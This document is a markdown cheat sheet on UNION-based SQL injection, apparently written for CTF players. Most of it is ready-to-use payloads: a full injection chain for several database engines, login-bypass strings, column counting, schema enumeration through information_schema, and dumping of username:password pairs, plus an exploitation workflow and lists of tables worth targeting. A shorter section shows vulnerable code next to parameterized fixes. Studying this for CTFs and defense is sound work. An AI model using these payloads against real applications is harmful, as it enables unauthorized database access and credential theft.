# SQL Injection — Basics

---

## Quick Reference

| Step | Goal | Payload |
|------|------|---------|
| 1 | Detect SQLi | `'` / `' OR 1=1--` |
| 2 | Fingerprint DB | `@@version` / `version()` |
| 3 | Count columns | `' ORDER BY N--` |
| 4 | Find string column | `' UNION SELECT 'a',NULL--` |
| 5 | Get DB name | `' UNION SELECT NULL,database()--` |
| 6 | Get tables | `FROM information_schema.tables` |
| 7 | Get columns | `FROM information_schema.columns` |
| 8 | Dump data | `SELECT username,password FROM users--` |

```sql
-- Full chain — MySQL / MSSQL (3-column target)
' ORDER BY 3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,database(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--

-- Full chain — SQLite (3-column target)
' ORDER BY 3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,sqlite_version(),NULL--
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

---

## What is SQL Injection? 🔓

SQL Injection happens when user input is inserted directly into a SQL query without sanitization. The attacker breaks out of the string context and injects their own SQL logic — changing what the query does entirely.

**Impact:**
- 🔴 Read any data the DB user can access
- 🔴 Extract credentials, tokens, and secrets
- 🔴 Enumerate the entire database structure
- ⚠️ This guide covers visible output only (UNION-based)

**The core idea:**

```sql
-- What the app builds:
SELECT * FROM products WHERE id = '1'

-- What you inject (input: 1' OR '1'='1):
SELECT * FROM products WHERE id = '1' OR '1'='1'
--                                    ↑ now returns ALL rows
```

---

## Detecting SQL Injection

Start by breaking the query syntax, then confirm you control the logic.

**Step 1 — Trigger an error** with a quote:

```sql
'
"
`)
```

A database error or changed response = likely injectable ✅

**Step 2 — Confirm with logic tests:**

```sql
' OR 1=1--      ← always true  → more/all rows returned
' OR 1=2--      ← always false → fewer/no rows returned
```

If the two responses differ, SQL injection is confirmed. 🔓

**Step 3 — Test every input surface:**
- URL parameters (`?id=1`, `?category=shoes`)
- Search boxes and filters
- Login fields (username and password)
- Hidden form fields — intercept with Burp Suite
- Cookies and HTTP headers

---

## Identifying the Database

Different databases use different syntax. Fingerprint early so your payloads work first try.

| Database | Version Payload | Concatenation | Comment |
|----------|----------------|---------------|---------|
| MySQL | `@@version` | `CONCAT(a,b)` | `--` or `#` |
| MariaDB | `@@version` | `CONCAT(a,b)` | `--` or `#` |
| PostgreSQL | `version()` | `a \|\| b` | `--` |
| Oracle | `v$instance` | `a \|\| b` | `--` |
| SQL Server | `@@version` | `a + b` | `--` |
| SQLite | `sqlite_version()` | `a \|\| b` | `--` |

**Inject into a visible column to read the version:**

```sql
' UNION SELECT NULL,@@version,NULL--              -- MySQL / MariaDB / MSSQL
' UNION SELECT NULL,version(),NULL--               -- PostgreSQL
' UNION SELECT NULL,version,NULL FROM v$instance-- -- Oracle
' UNION SELECT NULL,sqlite_version(),NULL--        -- SQLite
```

**Quick fingerprint tricks:**

```sql
' AND 1=1#--                    -- # comment = MySQL / MariaDB only
' UNION SELECT NULL FROM dual-- -- FROM dual  = Oracle only
' UNION SELECT NULL,sqlite_version(),NULL-- -- sqlite_version() = SQLite only
' AND 'a'='a'--                 -- works everywhere (generic confirm)
```

⚠️ **Oracle rule:** every `SELECT` must include a `FROM`. Use `FROM dual` as a dummy table when you have no real target yet.

---

## Union-Based Extraction

UNION appends a second query and returns its results alongside the original. Your injected `SELECT` must match the original query's **column count** and use **compatible types**.

### Step 1 — Count the Columns

**Method A — ORDER BY (fastest):**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here = 2 columns
```

Increment until you get an error. Last working number = column count.

**Method B — UNION NULL (most reliable):**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Add NULLs until the error disappears. NULL is compatible with any data type.

### Step 2 — Find the String-Reflecting Column

Swap each NULL for a string to find which column appears in the page output:

```sql
' UNION SELECT 'INJECT',NULL,NULL--
' UNION SELECT NULL,'INJECT',NULL--
' UNION SELECT NULL,NULL,'INJECT'--
```

Look for `INJECT` in the response. That position is your extraction channel ✅

### Step 3 — Extract the Database Name

```sql
' UNION SELECT NULL,database(),NULL--            -- MySQL / MSSQL
' UNION SELECT NULL,current_database(),NULL--     -- PostgreSQL
' UNION SELECT NULL,ora_database_name,NULL FROM dual--  -- Oracle
```

### Step 4 — List All Tables

```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- PostgreSQL (alternative)
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--

-- Oracle
' UNION SELECT NULL,table_name,NULL FROM all_tables--
```

### Step 5 — List Columns in a Table

```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Oracle
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

### Step 6 — Dump the Data

```sql
-- Two separate columns
' UNION SELECT NULL,username,password FROM users--

-- Concatenated into one column
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--      -- MySQL
' UNION SELECT NULL,username||':'||password,NULL FROM users--             -- PostgreSQL / Oracle
' UNION SELECT NULL,username+':'+password,NULL FROM users--               -- SQL Server

-- All rows in one result
' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR ' | '),NULL FROM users--  -- MySQL
' UNION SELECT NULL,STRING_AGG(username||':'||password,', '),NULL FROM users--             -- PostgreSQL
```

---

## Comment & Termination Syntax

Everything after your injected payload must be commented out so the rest of the original query doesn't cause errors.

| Database | Supported Comments |
|----------|--------------------|
| MySQL | `--` (with space), `#`, `/* */` |
| PostgreSQL | `--`, `/* */` |
| Oracle | `--`, `/* */` |
| SQL Server | `--`, `/* */` |

```sql
' UNION SELECT NULL,NULL--       ← universal, works almost everywhere
' UNION SELECT NULL,NULL#        ← MySQL only
' UNION SELECT NULL,NULL/**/     ← inline comment alternative
```

---

## Exploitation Workflow

1. **Find the injection point** — test `'` on every input, look for errors or behavior changes
2. **Confirm control** — compare `' OR 1=1--` vs `' OR 1=2--` responses
3. **Fingerprint the database** — inject `@@version` or `version()` to identify the engine
4. **Count columns** — use `ORDER BY N--` until error, note last valid number
5. **Confirm with NULLs** — `' UNION SELECT NULL,...--` matching exact column count
6. **Find string column** — swap NULLs for `'INJECT'` one position at a time
7. **Get database name** — inject `database()` or equivalent into the string column
8. **List tables** — query `information_schema.tables` filtered by the current database
9. **Pick the target table** — look for `users`, `admin`, `accounts`, `credentials`, `flag`
10. **List columns** — query `information_schema.columns` for that specific table
11. **Dump the data** — `SELECT username,password FROM <table>` through your UNION column

---

## Common Vulnerable Patterns

**Unparameterized URL parameter:**

```python
# ❌ Vulnerable
query = "SELECT * FROM products WHERE id = " + request.args.get("id")

# ✅ Secure
cursor.execute("SELECT * FROM products WHERE id = %s", (request.args.get("id"),))
```

**Unparameterized login form:**

```php
// ❌ Vulnerable
$sql = "SELECT * FROM users WHERE username='$u' AND password='$p'";

// ✅ Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$u, $p]);
```

**Unparameterized search field:**

```javascript
// ❌ Vulnerable
const q = `SELECT * FROM items WHERE name LIKE '%${term}%'`;

// ✅ Secure
db.execute("SELECT * FROM items WHERE name LIKE ?", [`%${term}%`]);
```

**Unparameterized ORDER BY** (placeholders don't work here — must whitelist):

```python
# ❌ Vulnerable
query = f"SELECT * FROM products ORDER BY {request.args.get('sort')}"

# ✅ Secure
allowed = ['price', 'name', 'date']
col = request.args.get('sort')
if col not in allowed: col = 'name'
query = f"SELECT * FROM products ORDER BY {col}"
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```sql
'                    -- syntax error = injectable
' OR 1=1--           -- always-true confirm
' OR 'a'='a'--       -- alternative always-true
```

**Speed tips:**
- ✅ Use `ORDER BY` first — it's faster than adding NULLs one by one
- ✅ Once column count is confirmed, jump straight to `UNION SELECT NULL,...--`
- ✅ Use Burp Suite Repeater to iterate payloads without refreshing manually
- ✅ Always enumerate via `information_schema` — don't guess table names
- ✅ Use `CONCAT()` or `||` to merge columns when only one position reflects output
- ⚠️ Getting no rows? Try `UNION ALL` — plain `UNION` silently deduplicates results

**Common CTF entry points:**

- **`?id=1`** → classic, always try this first
- **`?category=`** → often injectable, returns item lists
- **Login username field** → `' OR 1=1--` for bypass
- **Hidden POST fields** → intercept in Burp, inject into `id` or `ref` params
- **Tables worth targeting:** `users`, `flag`, `admin`, `secrets`, `credentials`

---

## Key Takeaways

- ✅ Always confirm injection with a true/false pair before moving forward
- ✅ Fingerprint the database first — syntax differences will break your payloads
- ✅ Column count must match exactly; NULLs keep you type-safe while counting
- ✅ `information_schema` is your map: database name → tables → columns → data
- ✅ Oracle always needs `FROM dual`; string concatenation syntax differs per engine